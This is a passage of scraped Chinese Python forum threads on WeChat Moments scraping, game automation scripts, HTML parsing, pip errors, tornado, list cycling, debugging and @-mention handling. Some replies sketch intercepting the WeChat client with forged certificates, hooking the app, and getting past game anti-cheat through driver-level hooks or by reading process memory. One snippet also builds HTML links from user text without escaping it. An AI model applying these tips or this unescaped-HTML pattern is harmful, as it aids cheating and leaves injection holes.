{"content": ["<div class=\"topic_content\">我有个微信号，加了很多有上百个微商，每天朋友圈会有很多产品图片刷屏，偶尔会让人有眼前一亮的产品，但是实在没功夫天天盯着朋友圈刷微商图片，重复率极高，看多了真的会吐。想着能不能用 python 写个爬虫，把图片采集下来，然后图片去重，然后这些图片也可以算是一笔资源。对 python 的掌握程度，基本上能实现网页的爬虫功能，但是不了解朋友圈怎么爬取。</div>"], "reply": "28", "tittle": "想用 python 采集自己朋友圈的图片，不知道有没有什么思路可以实现呢？", "comment": ["模拟登录", " 网页微信不是需要扫码登录么？同样可以模拟登陆么？我只知道可以模拟表单登陆。", "抓包，分析接口，然后模拟请求", "本帖的回复都是屁话，包括本回复", "0 、用 replica 截取 APP 对外的请求\r", "1 、导出 session log\r", "2 、根据 log 的请求类型&&URL 爬取图片", "你的朋友圈不是一个公开数据,不能直接爬取,必须模拟登陆.\r", "\r", "有个其他的思路,用电脑做一个 wifi 热点,手机连上查看朋友圈,然后在电脑上抓包手机的请求日志,从中把图片地址都分析出来.", "模拟登陆不现实，微信没有给接口，网页版又没有朋友圈。在网络传输时截取数据是比较好的方法，但是全自动又有点难", "话说 我也想做个 feature 把自己朋友圈的内容导出  但是嫌太麻烦 已经搁置挺久的了😂", "试试手机上的按键精灵", "不知道传输的时候有没有加密。加密的话，逆向 app ， hook 获取朋友圈内容的函数", "itchat 应该行", "我建议用按键精灵点安卓模拟器", " 非常感谢你的支持！但 itchat 实际不包含朋友圈的 api ，关于朋友圈的抓取还是建议阅读其他的回复。", "所以我一直在想微信书( ", "告诉微商自己喜欢什么 帮你留意一下", "用 fiddler 伪造证书，抓微信客户端的通信数据。手机模拟器里面不停的刷新朋友圈， fiddler 监控数据流，如果是图片就保留下来。", "根用什么语言没关系。", "不用抓包, 用 Xposed 就可以搞定. 已有导出朋友圈的插件, 直接使用就可以.", "抓妹子照片，又想去除微商。怎么搞", " 参考使用说明 ", "\r", "估计用的是魔改的客户端，对接自己的服务器做的一个服务，类似 xposed 的那种。", " 多谢建议！这个办法不能批量留存，我不是想买东西，而是想整合朋友圈里的微商资源。目前和这些卖家就是点对点沟通，效率太低，人工沟通成本也太高了。", " 求插件名字", " 话说我是十分建议朋友圈能出一个朋友圈分组折叠，或者关键词屏蔽的内容过滤插件功能，能做到部分内容精准屏蔽与过滤。\r", "\r", "我的朋友圈基本上被业务合作伙伴发的产品宣传图片刷屏，虽然对这种东西十分厌恶，但是又不能完全屏蔽，因为有些信息对工作有帮助，每天十分苦恼。", " Xposed 的“微信防撤回”模块可以屏蔽朋友圈关键字，另外一个可以在酷安搜索“微信朋友圈数据导出”，不过好像只支持导出文本", " 魔改客户端是什么？", "朋友圈的数据是能够代码抓取的，你去参考同步圈 app  ", "先搞一套 py 圈的 api= =,如果有的话", "python 有微信接口的啊，看看它的文档，然后就当网页抓取"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>平时偶尔会玩某个 Windows 客户端游戏，后来嫌没时间赚金币打不过人民币玩家就很少玩了。某天心血来潮学了按键精灵，写个简单的脚本赚了好多金币，一下子就激活了我的兴趣，兴冲冲列了好多需求（我不知道我是对打游戏感兴趣还是对写代码感兴趣哈哈），结果发现按键论坛很多插件找起来很麻烦，有些要收费，文档也不清晰，在官方社区发帖问了几个问题没什么人回答，热情一下子被浇灭了。</p>\n<p>最近我在学 Python 写服务器脚本，觉得 Python 真是无所不能，我想既然按键精灵可以做到的那 Python 应该也可以吧，而且按键精灵的运行进程太明显了，想封我应该挺简单。我分析了一下，我想要实现的功能无非是：</p>\n<p>1 、让游戏客户端在后台运行，不影响我使用键鼠和软件，学习娱乐两不误。</p>\n<p>2 、识别、提取文字和识别区域内的图片。</p>\n<p>3 、简单的鼠标模拟输入，都是点点点。</p>\n<p>4 、最复杂就是做个小窗口，实时输出日志，显示现在脚本跑到那一步了和现在赚了多少金币等游戏状态。</p>\n<p>有没有人用 Python 做过这种游戏脚本？最好也了解按键精灵的知识，客观分析下用哪种语言做脚本会更快更好？</p>\n</div></div>", "<div class=\"topic_content\">评论好乱，很多评论都不知道答主支持哪个，希望大家尽量按这个格式回答：\r<br>一、我选 Python /我选按键 /我知道更好的语言；\r<br>二、我做过 /我知道 Python 或按键脚本可以做到原题目的 1/2/3/4 点；\r<br>三、最后就是吐槽啦。</div>", "<div class=\"topic_content\">很多人没有回答我第四点，第四点很难做啊，我完全不知道脚本精灵能不能做到这一点 @<a target=\"_blank\" href=\"/member/_\">_</a>@\r<br>\r<br>这个窗口就是拿来滚动输出字符串的，就像 shell 或 console 一样，我自己能够 print 我预设的字符串出来。\r<br>我习惯写日志，那样我就不用手动打开 *.log ，也能实时看到脚本的输出信息。\r<br>\r<br>比方说就是在 Windows 的桌面上，除了游戏窗口，还有一个 200*200 的小窗口，能够滚动输出 “现在已经匹配到对手了” “已经结束战斗” “正在等待对手” 这些文字。</div>", "<div class=\"topic_content\">@<a target=\"_blank\" href=\"/member/_\">_</a>@ 难道就没人来回答一下需求四那个实时输出框吗？\r<br>就像控制台一样滚动显示代码就行，不知道怎么实现，求思路方案</div>"], "reply": "42", "tittle": "Python 做游戏脚本可以做得比按键精灵更快更好吗？", "comment": ["易语言专门做这个的", "ahk", "这不就是外挂了吗......\r", "\r", "一般来说..外挂这种功利性东西...不要指望有啥人会分享这方面经验..\r", "\r", "闷声发大财才是最吼的.", "用 大漠插件\r", "或者 天使插件\r", "天使的主要功能都是免费的\r", "最早用按键精灵调用天使，后来用 python 调用他来写过", "我只会写 python 的黑窗口程序~~~", " 我问的是二选一，你这样我就更纠结了:)", " 看了一下，感觉不错，你是意思是 AutoHotKey 比那两个都要好？我先了解下", " 虽然这不是作弊，但的确外挂了呢，你说的我也考虑过，难道只能摸着石头走路？但是我的功能都好简单的啊", " 大漠插件 和 天使插件 都可以被 Python 调用？这两个插件没了解过呢，能简单说一下怎么调用吗", " 那就帮我顶一下呗:)", "win api  窗口句柄 鼠标键盘消息 等等", "按键精灵做的工作比你想象的要多得多， 模拟输入不单是发个 windows 消息就完了的，现在的客户端游戏都有反外挂机制， 很可能需要在驱动层模拟输入，甚至在驱动层反复 hook 纠缠。\r", "另外如果要最小化后还能获取游戏数据， 你需要直接读取游戏进程的内存，或调用其函数。这就不是模拟输入了。", " 可以看看这个文件，以前双十一写的。\r", "\r", "项目的其他文件也可以参考，这个比较简单。我用的天使，天使的函数可以查看他的 chm 文档。", "按键精灵现在的功能简直要逆天了。在游戏脚本方面，不得不服。以前粗略学过一段时间。\r", "写这个东西，最主要的是思路。它的生态系统已经很强大了，谁更快更好不知道。但是没有必要再在 python 下面造轮子了，而且按键的学习成本也不高，好多小学没毕业的人都写游戏脚本来赚钱。", "还有 TC", "Python 有 bi 格.\r", "按键精灵上手比较容易.", "听说 lua 比较厉害", "我在想一个问题，有没有这种按键精灵，因为有反外挂的机制，为了模拟输入各种纠结，为何不用 MCU 如 arhuino micro 等做成真正的受控键盘，主机通过串口等发送键位数据，然后像真正的键盘一样发按键，反外挂对这种硬件级的模拟没办法吧", " 按键精灵有硬件版 叫按键盒子", "了解下 UI 自动化测试，说简单点其实做的这是这种代替手来点点点的工作， python 下有相关的库来支撑 windows 程序的对象识别，或者实现 ocr 。", "234 能做到，之前做过 fifaol3 自动买卡的，就是图像文字识别还是做不好。", " 234 是?", "第一次接触的代码就是按键精灵！！！！！", "那你改写手机的吧 。。。。。。。手机端 触动精灵 体验要比按键精灵体验好 N 倍", " 第二条，第三条，第四条。我是用 winapi 撸的，网上有现成的 python 做外挂的教程", "1 和 2,3 有冲突吧?后台运行如何实现 2,3 中的功能?", "按键精灵的大漠插件可以实现大部分的后台操作 原来写过类似的游戏脚本\r", "大漠有免费版的, 应该够你用的了", " @", " 好，那我还是选择按键精灵了，但是我想问我的第四点，小窗口怎么做好呢", " @", " @", " 那小窗口怎么实现，这个不知道怎么做好", "我记得按键精灵里面可以做界面 直接拖控件 更新控件数值", " 我也写了半自动的买卡，最后合卡炸了超大一个礼花，太棒了！", " @", " 哈哈我说的游戏就是 FIFA OL3 ，我看现成的辅助很多功能都满足不了我，所以就想自己弄一个了，我说的需求 4 有什么建议嚒", " 那就好说了。。\r", "弃坑吧。。贬值太快，要么烧钱要么被人玩。。\r", "歪楼了", "python 做不了，涉及到很底层的东西，调试以及反调试，系统驱动相关的东西 py 没法做。现在能用 winapi 投递消息的游戏没几个了。", " 你说得很对，这游戏贬值太快，幸亏没充过钱\r", "但是我迷上了用脚本打游戏怎么办:-)", " 我用的是图像识别，但是太费劲了。老实说还是抓包分析比较靠谱。或者你可以先输入自己拥有的金额，然后仅仅判断购买成功的次数(同一个球员购买成功的包应该是一样的吧，一个猜想不一定对)，再自己算一个大概的价格咯", " 我的需求四是原题目里：\r", "4 、最复杂就是做个小窗口，实时输出日志，显示现在脚本跑到那一步了和现在赚了多少金币等游戏状态。", " 那金币数量(脚本执行结果)你是怎么知道的。有可能网络延时，或者你的笔记本没电了，直接强退了。怎么知道脚本执行一次的确达到了预期的效果", " 看来重点说错了，我的关注点是做一个小窗口，这个窗口能输出字符串就好了，字符是什么没关系\r", "\r", "就有点像 shell 一样，自己能够 print 字符串出来，我习惯写日志，那样我就不用总是手动打开 *.log 这样子\r", "\r", "就比如说现在我匹配到了对手， Windows10 的桌面上除了游戏窗口还有一个 200*200 的小窗口，能够滚动输出“现在已经匹配到对手了”这样。", " 貌似是模拟输入", " 但我是 PC 端游", "有大兄弟回答一下我第四个问题嚒\r", "求帮顶"]},
{"content": ["<div class=\"topic_content\">也就是说我想把几个按钮以网格布局的形式放进 qmainwindow 类里，具体来说就是把这几个按钮以网格布局放进一个类里，然后在 qmainwindow 子类里加入放按钮的那个类。\r<br>新手问题，希望帮忙解答下。</div>"], "reply": "1", "tittle": "我想问一下，如何在 qmainwindow 类里面加入网格布局？", "comment": ["用 qt designer 或者参考 pyqt 附带的例子。"]},
{"content": ["<div class=\"topic_content\">浏览器对 html 代码的容错性很强，像下面这句，两个标签开始结束的位置差开了，应该是个包含结构， a 包含 b ，结果错成了交叉结构。\r<br>但是这样浏览器也能正常解析。\r<br>\r<br>&lt;a target=\"_blank\" href=\"http://wenda.eask.org/\"&gt;&lt;b&gt;我要提问&lt;/a&gt;&lt;/b&gt;\r<br>\r<br>可是 BS4 在处理这样的页面时就中枪了，其实还有其他一些错误，比如，一个页面有好几个“&lt;body&gt;”标签，这个处理时比较简单，只保留第一个“&lt;body&gt;”，把后边的全删除即可。但这种交叉的我现在还想不出如何来处理。\r<br>\r<br>附上句中的地址 <a target=\"_blank\" href=\"http://www.eask.org/beijing/\" rel=\"nofollow\">http://www.eask.org/beijing/</a></div>"], "reply": "12", "tittle": "如何解决 html 代码中“<a><b></a></b>”这样的错误", "comment": ["使用容错性高的 html parser ，但是这个问题我记得 bs4 是可以解决的", "把标签写正确🙃", "lxml.html, html5parser", " 我用的就是 html parser", "  。。。。 html parser 是 general 的概念，不是某一个库或者东西。你应该尝试其他的 html parser\r", "\r", "\r", " lxml 是不行的， lxml 对 html 符合标准要求很严格", "碰上这种页面直接上正则表达式解决", " \r", "In [1]: import lxml.html\r", "\r", "In [2]: dom = lxml.html.fromstring(u'<a target=\"_blank\" href=\"http://wenda.eask.org/\"><b>我要提问</a></b>')\r", "\r", "In [3]: print lxml.html.tostring(dom, encoding=\"unicode\")\r", "<a target=\"_blank\" href=\"http://wenda.eask.org/\"><b>我要提问</b></a>", " pypi 现在上不去了，暂时没法试。如果是全文而不是这一句，能改过来吗？", " 不行啊，我做的是通用处理，像这种类型的没法判断错误原因，更没法用正则处理。", " 那就行:)", "只识别标签头，任意结束标签当当前起始标签的结束，这么干就随意交叉，只要头的顺序对就行", "写代码不严谨 或者使用编辑器的插件 自动补充关闭标签减少类似的错误代码"]},
{"content": ["<div class=\"topic_content\">UnicodeDecodeError: 'ascii' codec can't decode byte 0xb3 in position 9: ordinal not in range(128)\r<br>\r<br>\r<br>\r<br>Try to run this command from the system terminal. Make sure that you use the correct version of 'pip' installed for your Python interpreter located at 'C:\\Python27\\python.exe'.\r<br>\r<br>\r<br>\r<br>Collecting pip==8.1.2\r<br>\r<br>You are using pip version 7.1.0, however version 8.1.2 is available.\r<br>You should consider upgrading via the 'python -m pip install --upgrade pip' command.\r<br>C:\\Python27\\lib\\site-packages\\pip-7.1.0-py2.7.egg\\pip\\_vendor\\requests\\packages\\urllib3\\util\\ssl_.py:90: InsecurePlatformWarning: A true SSLContext object is not available. This prevents urllib3 from configuring SSL appropriately and may cause certain SSL connections to fail. For more information, see <a target=\"_blank\" href=\"https://urllib3.readthedocs.org/en/latest/security.html#insecureplatformwarning\" rel=\"nofollow\">https://urllib3.readthedocs.org/en/latest/security.html#insecureplatformwarning</a>.\r<br>  InsecurePlatformWarning\r<br>  The repository located at <a target=\"_blank\" href=\"http://pypi.douban.com\" rel=\"nofollow\">pypi.douban.com</a> is not a trusted or secure host and is being ignored. If this repository is available via HTTPS it is recommended to use HTTPS instead, otherwise you may silence this warning and allow it anyways with '--trusted-host <a target=\"_blank\" href=\"http://pypi.douban.com\" rel=\"nofollow\">pypi.douban.com</a>'.\r<br>Exception:\r<br>Traceback (most recent call last):\r<br>  File \"C:\\Python27\\lib\\site-packages\\pip-7.1.0-py2.7.egg\\pip\\basecommand.py\", line 223, in main\r<br>    status = self.run(options, args)\r<br>  File \"C:\\Python27\\lib\\site-packages\\pip-7.1.0-py2.7.egg\\pip\\commands\\install.py\", line 282, in run\r<br>    requirement_set.prepare_files(finder)\r<br>  File \"C:\\Python27\\lib\\site-packages\\pip-7.1.0-py2.7.egg\\pip\\req\\req_set.py\", line 334, in prepare_files\r<br>    functools.partial(self._prepare_file, finder))\r<br>  File \"C:\\Python27\\lib\\site-packages\\pip-7.1.0-py2.7.egg\\pip\\req\\req_set.py\", line 321, in _walk_req_to_install\r<br>    more_reqs = handler(req_to_install)\r<br>  File \"C:\\Python27\\lib\\site-packages\\pip-7.1.0-py2.7.egg\\pip\\req\\req_set.py\", line 491, in _prepare_file\r<br>    session=self.session)\r<br>  File \"C:\\Python27\\lib\\site-packages\\pip-7.1.0-py2.7.egg\\pip\\download.py\", line 825, in unpack_url\r<br>    session,\r<br>  File \"C:\\Python27\\lib\\site-packages\\pip-7.1.0-py2.7.egg\\pip\\download.py\", line 673, in unpack_http_url\r<br>    from_path, content_type = _download_http_url(link, session, temp_dir)\r<br>  File \"C:\\Python27\\lib\\site-packages\\pip-7.1.0-py2.7.egg\\pip\\download.py\", line 884, in _download_http_url\r<br>    file_path = os.path.join(temp_dir, filename)\r<br>  File \"C:\\Python27\\lib\\ntpath.py\", line 108, in join\r<br>    path += \"\\\\\" + b\r<br>UnicodeDecodeError: 'ascii' codec can't decode byte 0xb3 in position 9: ordinal not in range(128)</div>"], "reply": "5", "tittle": "python 安装第三方库的时候出现的问题，求助", "comment": ["你的 Windows 用户名是不是中文?", "可能需要先 chcp 65001 。。。", "检查输出目标编码", " 需要改成英文是吗", " 是的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我知道 tornado 可以用如下方式，同时并发 n 个请求：</p>\n<p>response1, response2,... responsen = yield [http_client.fetch(url1) , http_client.fetch(url2), ...... ,http_client.fetch(url2) ]</p>\n<p>等到 n 个请求都响应了之后，会返回给程序控制权，那么我的问题是：</p>\n<p>1.如果我想其中一个有结果了，就返回 yield 继续执行，应该怎么实现？</p>\n<p>2.如果我要让其中 i 个请求有结果了就返回呢？</p>\n</div></div>"], "reply": "5", "tittle": "tornado 在同时发出 n 个请求时，如何让其中 1 个有结果就返回?", "comment": ["你是方法 A 说发出 n 个请求，当 i 个请求返回时（ i 小于等于 n ）。放弃其余请求，方法 A 返回。\r", "\r", "这种情况下你可以注册多个 handler 扔到 ioloop 里，然后搞个计数器。\r", "或者使用 threading ，然后循环坚持每个线程有没有返回。\r", "\r", "第一种复杂点，第二种代码少，但实际上是错的， for 循环会阻塞。", "yieldpoints.waitany()", " 这里是 i 个请求的回答：\r", " 这两个帖子都是我发的，为了能更好的收集到问题，谢啦。。。"]},
{"content": "", "reply": "27", "tittle": "n=7 list1=['a','b','c','d'] 知道这两个结果如何输出结果 a b c d a b c ？", "comment": ["a=['a','b','c','d']\r", "n=7\r", "c=0\r", "while c < n:\r", "    for b in a:\r", "        print(b)\r", "        c+=1\r", " 这样的为什么不行啊\r", "不是 c <n 的调解不成立时候不再循环么？", "(l * (n // len(l) + 1))[:n]", "看完条件和结果，第一个反应是输出完一遍 list1 内容后再次输出 n-list1.length 次。\r", "那样的话可以写递归吧？\r", "\r", "基准情形就是 n<=list1.length 。", " 条件判断要执行完 FOR 才会判断。取余输出多好", "2 楼的方法很好", "[list1[i%len(list1)] for i in range(n)]", "```\r", "import itertools\r", "\r", "n=7\r", "list1=['a','b','c','d']\r", "print list(itertools.islice(itertools.cycle(list1), 0, n))\r", "```", "(list1 * 2)[:n]", " 66666", "这不是循环模运算嘛！", "4L, 8L 正解\r", "\r", "引战：还是 Ruby 写起来舒心:  lst.cycle.take(n)", "这种简单的方法肯定是从 list 构造一个 stream(cycle)，然后 take 咯", "import itertools\r", "list(itertools.islice(itertools.cycle(list1), 0, n))", " [list1[i%len(list1)] for i in range(n)] 这个不错，原来 1%4 结果会是 1.。。", "取余大法好，凡是这种要回头遍历的都是取余", "(list1 * 2)[:n]", "import math\r", "    (list1 * math.ceil( n /  len(list1)  )  )[:7]\r", "\r", "简化这个问题：\r", "从一个重复 list1 的列表里面取出前 n 个元素；\r", "确定重复的倍数，重复次数是 list1 元素数量的倍数；\r", "n / len(list1)再进一即可找到倍数，但由于存在小数的情况，所以调用 math.ceil （）进一取整；\r", "\r", "和 2L 的方法差不多，只是多调用 math 的 ceil 函数。在 python 里面，个人觉得如果可以不写循环尽量不写循环。当需要调用的要素变多，编写循环就会更复杂。", "没学过 py ， py 里没有取模运算符吗", "```\r", "func takeOrCompensate<T>(n: Int, arr: [T], initial: Int = 0) -> [T] {\r", "    if n <= 0 {\r", "        return []\r", "    }\r", "    \r", "    if arr.count == 0 {\r", "        return []\r", "    }\r", "    \r", "    return [arr[initial % arr.count]] + takeOrCompensate(n: n-1, arr: arr, initial: (initial + 1))\r", "    \r", "}\r", "\r", "print(takeOrCompensate(n: 7, arr: [\"a\", \"b\", \"c\", \"d\"]))\r", "```", " 前面已经各种正解了。如果要让你的代码得到期望的结果，在 for 循环里加个判断就行了，比如在 print() 前面来个\r", "if c == n:\r", "    break", "wnduan 在 n=7 list1=['a','b','c','d'] 知道这两个结果如何输出结果 a b c d a b c ？ 里回复了你   4 小时 49 分钟前   删除\r", " 前面已经各种正解了。如果要让你的代码得到期望的结果，在 for 循环里加个判断就行了，比如在 print() 前面来个\r", "if c == n:\r", "break\r", "=============\r", "抱歉 准备回复您呢 点了回复却把你的回复隐藏了 也不知道如何再次显示。\r", "嗯 这样一改 确实是简单多了。\r", "a=['a','b','c','d']\r", "n=7\r", "c=0\r", "while c < n:\r", "    for b in a:\r", "        if c==n:\r", "            break\r", "        print(b)\r", "        c+=1 \r", "a\r", "b\r", "c\r", "d\r", "a\r", "b\r", "c\r", ">>>", "  抱歉 准备回复您呢 点了回复却把你的回复隐藏了 也不知道如何再次显示。\r", "嗯 这样一改 确实是简单多了。\r", "a=['a','b','c','d']\r", "n=7\r", "c=0\r", "while c < n:\r", "    for b in a:\r", "       if c==n:\r", "         break\r", "      print(b)\r", "      c+=1", "loop = lambda arr, n, result=[]:len(result) == n and result or loop(arr, n, result + [arr[(len(result)) % len(arr)]])\r", "\r", "loop(list1, n)", "没看清题目，应该是\r", "\r", "loop = lambda arr, n, result=[]:len(result) == n and ' '.join(result) or loop(arr, n, result + [arr[(len(result)) % len(arr)]])", " 没关系的，好像只是你自己那里隐藏了，其实我还看的到，哈哈 ～。", "(list1*int(round(n*1.0/len(list1))))[:n]"]},
{"content": ["<div class=\"topic_content\">1.统计、概率论、时间序列分析、随机过程、计量经济学。\r<br>2.多看卖方研报\r<br>有人写过一个程序员学量化投资系列可以看下：\r<br>程序员学量化投资（一）：买入卖出： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fa3ef0228e5b887ce50e04\" rel=\"nofollow\">https://uqer.io/community/share/56fa3ef0228e5b887ce50e04</a>\r<br>程序员学量化投资（二）：指价建仓 ： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fa4081228e5b8886e510e2\" rel=\"nofollow\">https://uqer.io/community/share/56fa4081228e5b8886e510e2</a>\r<br>程序员学量化投资（三）：区间内低买高卖： <a target=\"_blank\" href=\"https://uqer.io/community/share/56fabc58228e5b8887e51001\" rel=\"nofollow\">https://uqer.io/community/share/56fabc58228e5b8887e51001</a>\r<br>程序员学量化投资（四）：分析收益率自动追涨 <a target=\"_blank\" href=\"https://uqer.io/community/share/56fbb4dd228e5b1f861a8e14\" rel=\"nofollow\">https://uqer.io/community/share/56fbb4dd228e5b1f861a8e14</a>\r<br>程序员学量化投资（五）：移动平均线之金叉和死叉 <a target=\"_blank\" href=\"https://uqer.io/community/share/56fbec69228e5b1f8a1a8eb0\" rel=\"nofollow\">https://uqer.io/community/share/56fbec69228e5b1f8a1a8eb0</a>\r<br>程序员学量化投资（六）：成交量之缩量增量 <a target=\"_blank\" href=\"https://uqer.io/community/share/57028067228e5b4903eb3fd3\" rel=\"nofollow\">https://uqer.io/community/share/57028067228e5b4903eb3fd3</a>\r<br>程序员学量化投资（七）：量价八阶律的简单实现 <a target=\"_blank\" href=\"https://uqer.io/community/share/57124fae228e5b827e7f5491\" rel=\"nofollow\">https://uqer.io/community/share/57124fae228e5b827e7f5491</a>\r<br>一日一练： Python 程序员的 10 个常见错误 <a target=\"_blank\" href=\"https://uqer.io/community/share/57218746228e5b633c7b93ee\" rel=\"nofollow\">https://uqer.io/community/share/57218746228e5b633c7b93ee</a></div>"], "reply": "5", "tittle": "学计算机专业，以后想往自动交易和量化投资方面发展，不知道这方面现在到底什么情况，要学习一些什么专业知识呢？", "comment": ["这年头广告都这么打的么……", "这种要举报", "举报了", "有完没完", "先举报一波。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>multiprocessing 的子进程错误完全没有错误提示，要怎样才能 debug 呢 ？</p>\n<p>环境是 windows python 2.7</p>\n<p>例如下面这段带码</p>\n<pre>#-*-coding:utf-8-*-\nimport multiprocessing\nfrom multiprocessing import Pool,Process,Queue\nimport time\nimport pdb\n\ndef add(i,item,queue):\n    item[\"i\"] = i\n    queue.put(item)\n\ndef store(queue):\n    time.sleep(1)\n    while True:\n        print queue.get()\n\nif __name__ == \"__main__\":\n    item = {}\n    manager = multiprocessing.Manager()\n    queue = manager.Queue()\n    pool = Pool()\n    pool.apply_async(store,args = (queue,))\n    try:\n        for i in range(10):\n            pool.apply_async( add, args = (i,item,queue,\"这里多了个参数但没任何错误提示\"))\n            #pool.apply_async( add, args = (i,item,queue)) #这样可以正常运行\n    except Exception,e:\n        print Exception,\":\",e\n    time.sleep(2)\n    pool.terminate()\n    pool.join()\n</pre>\n</div></div>", "<div class=\"topic_content\">用 try 把函数里的代码包起来就好了，不知道为啥不包就不报错。</div>"], "reply": "1", "tittle": "multiprocessing 的 debug 问题 ？", "comment": ["没执行到 add 方法里啊，你 apply_async 调用过后.get() 执行后就知道有报错了啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前一直 debug 好好的。今天突然就不行了。</p>\n<pre><code>C:\\Python27\\python.exe \"C:\\Program Files (x86)\\JetBrains\\PyCharm 2016.2.3\\helpers\\pydev\\pydevd.py\" --multiproc --qt-support --client 127.0.0.1 --port 52873 --file D:/cv/main.py\npydev debugger: process 11488 is connecting\n\n\nProcess finished with exit code 1\n</code></pre>\n<p>貌似 Connect 超时就退出了</p>\n<p>Windows 防火墙上 pycharm 和 python 应该都是允许通信的。</p>\n<p>是不是 Windows 10 更新了什么奇怪的东西？</p>\n</div></div>"], "reply": "9", "tittle": "PyCharm 不能 debug 是什么情况？", "comment": ["3 招就可以了,\r", "重启,重装 pycharm,重装 windows.", "这玩意经常出点错，我还遇见过 run 不起来提示 IP 占用的情况，无解，只好换了个 IP 。。。\r", " \r", "不过过几天又试了下一直用的 IP  run ，又可以\r", " \r", "囧", " 我是自己写的脚本，不是服务器后端，跟 ip 端口没什么关系。\r", "现在只能 run 不能 debug 无比蛋疼...", " 不是端口，是 IP 占用，换端口也起不来必须改 IP 地址\r", " \r", "比你这个还蛋疼。。。\r", " \r", "你这个把 pycharm 重启下可能就好了，再不行把电脑重启，或者把.idea 文件夹 rm 掉，都试试吧\r", " \r", "这玩意虽然收费，但是 bug 真的是不少\r", "\r", "4.x 经常卡顿， 5.x 的时候 shell 又经常调不起来，需要把 webserver  run 一遍然后点关闭，再重启，才能调起 python shell\r", " \r", "反正大毛病没有，小毛病一堆\r", " \r", "蛋定吧慢慢搞搞就好了", "我用 Pycharm 连进 windows10 的 Linux 子系统里远程调试也是这个错误，不知道如何解决。", " 是时候用 mac 啦", " Mac 下更加有问题, 动不动就有可能端口被重用了.", " 我从未遇到", " 运气不错"]},
{"content": ["<div class=\"topic_content\">就是我之前用 find_all 定位了一个标签，然后我想再次用 find_all 查询第一次 find_all 的结果，可是却失败了</div>"], "reply": "14", "tittle": "BeautifulSoup 怎样才可以 find_all 再次 find_all 结果", "comment": ["或者可不可以把 find_all 的结果全部转换成 string ，", "a = soup.findall('a')\r", "b = a[0].findall('b')", "改写一下 @", " ，来个范围攻击的……\r", "\r", "a_b = [a.findall('b') for a in soup.findall('a')]\r", "a_b_flat = [result for a in soup.findall('a') for result in a.findall('b')]", " @", " 我把报错图片上传了，您看一下", "li 是 none ，上一个没找到？", " li[0]能打印出来，我用 print 打印出了，但是加上 b=li 那句话就打印失败了，很费解", "li[0].findall", " 好的，谢谢，等下上完课回去试试", "find_all 返回的结果是个 list ，要其中的结果得把它迭代一遍才行，最好再加个异常处理，防止出现你这样的情况", "get_all_secondary_elements(bs)\r", "\r", "\ttry:\r", "\t\ttop_elements = bs.find_all(...)\r", "\r", "\t\tfor top_element in top_elements:\r", "\r", "\t\t\tsecondary_elements = top_element.find_all(...)\r", "\r", "\t\t\tif secondary_elements is not None:\r", "\t\t\t\tyield secondary_elements\r", "\r", "\texcept (AttributeError, TypeError):\r", "\t\tyield\r", "\r", "\r", "secondary_elements = list(get_all_secondary_elements)", "转成 tag 再 findall", " \r", "\r", "li = soup.findAll('div', class = 'div_content')\r", "print li\r", "b = li[0].findAll('ul')\r", "print b\r", "\r", "再试试", " 改成 find_all 就好了…"]},
{"content": ["<div class=\"topic_content\">前端的 @ 默认是如何实现的我已经知道，但是传递到后端 [ @<a target=\"_blank\" href=\"/member/xxx\">xxx</a> ]  ，再次在页面上显示时是怎么处理的？</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h2>最后补充（我揣测的 V2EX @ 功能的实现）：</h2>\n<ul>\n<li>前端使用 jquery.autocomplete 通过 参数 [match: /(^|\\s)@(\\w*)$/] ,当输入@时，触发下拉菜单显示。</li>\n<li>提交到后台，通过正则替换保存的文本内容。然后将带有 超链接 的评论存入到数据库。 [缺点：因为是html格式的数据，原生app那儿处理会有问题] 。</li>\n</ul>\n<blockquote>\n<p>正则替换的方法：</p>\n</blockquote>\n<pre><code>def replaceContent(self, content):\n        pattern = r'@(.*?) '\n\n        def repl(match):\n            if match.group(0):\n                _link_name = match.group(0)\n                link_name = re.findall(pattern, _link_name)\n                return '@&lt;a href=\"/member/' + link_name[0] + '\"&gt;' + link_name[0] + '&lt;/a&gt; '\n\n        content = re.sub(pattern, repl, content)\n        return content\n</code></pre>\n<p>需要内容替换直接掉这个方法就好了</p>\n<p><strong>最后的最后 去了解一下 re.sub 中第二个参数</strong></p>\n</div></div>"], "reply": "32", "tittle": "V2EX 中 @ 一个人是怎么实现的？", "comment": ["正则替换", "\r", "通过正则提取出主题、回复里出现过的所有用户名，传递到后端检查用户是否传在，传在就加上正超链接", "存储的时候转为用户 id 存", " 在这个回复提交时做，还在展示列表的时候做？", "测试下各种情况下的 @ 。\r", "\r", "第一种情况 @", "\r", "\r", "第二种情况 @", "在发帖的时候就已经替换了吧", "页面上看到的应该只是正则替换，@不存在的 ID 仍然 会有下划线\r", "\r", "后台可能是检测下被 @ 的人是否存在，然后发通知过去吧", "被 @ 的提醒，是在提交的时候处理的\r", "前端显示的时候再次把所有 @ 转换成链接，也有可能会缓存格式化的内容，这样就省去每一次显示的时候格式化", "前端正则匹配，然后替换成链接。\r", "比如上边： ", "\r", "\r", "用户不存在就 404 ，存在就访问到相关页面了", " 应该是在将回复数据保存到数据库时 做了正则替换。他保存到数据库时就是 带 html 格式的回复内容。知乎直接使用的 div 做的富文本编辑器，他在前端 @完就会生成带有连接的 a 标签。", "前端正文正则匹配\r", " \r", "提交后端队列提醒", "压根不需要什么正则，就算你 @不存在的依然会显示链接。\r", "在打开 ", " 这个页面检查一次当前用户是否存在。\r", "至于收到提醒，插入一条记录呀，没有也插入呀，反正 @没有的人不存在。\r", "\r", "测试:\r", "\r", " 这里   带空格\r", " 这里  不带空格\r", "@这里  汉字\r", ",这里 带标点\r", " ，这里 带标点和空格", "前端正则匹配，后端检测 ID 是否存在并且发送提醒吧。\r", " \r", "@史蒂夫流口水了电风扇的饭了", " 后台需要用正则去处理你提交的内容。因为那个正则无法匹配到中文，所以那儿就没有显示超链接。 @不存在的人，因为后端没有验证处理。", "看前面讨论的 \r", "我插楼问个问题\r", "\r", "对于这种 @后的内容提取,比如用户名\r", "是前端提取后当,单独当一个参数给后台\r", "还是前端什么都不管 纯粹交给后台去正则处理\r", "...主要考虑到如果 @功能用的人多 正则性能又低下的话", "后端正则，转成链接\r", "\r", "猜想证实：\r", "\r", "\r", "\r", 